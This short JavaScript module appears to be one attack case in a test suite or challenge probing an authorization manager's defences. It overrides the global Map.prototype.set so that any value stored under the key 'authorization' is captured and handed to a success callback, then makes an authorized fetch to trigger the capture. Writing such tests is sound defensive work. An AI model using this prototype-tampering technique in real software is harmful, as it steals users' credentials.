const urlExample = "https://example.com";

export const attack = (authzManager, success) => {
  try {
    // You think the previous one was annoying?
    // No, this is annoying!
    const set = globalThis.Map.prototype.set;
    globalThis.Map.prototype.set = function(key, value) {
      if ((String(key)).toLowerCase() === "authorization") {
        success(value);
      }

      return set.call(this, key, value);
    };
  }
  catch (e) {
    console.log(" ok, you win :( \n", e.message);
  }
  authzManager.authorizedFetch([
    {
      url: urlExample,
      headers: {}
    }
  ]);
};
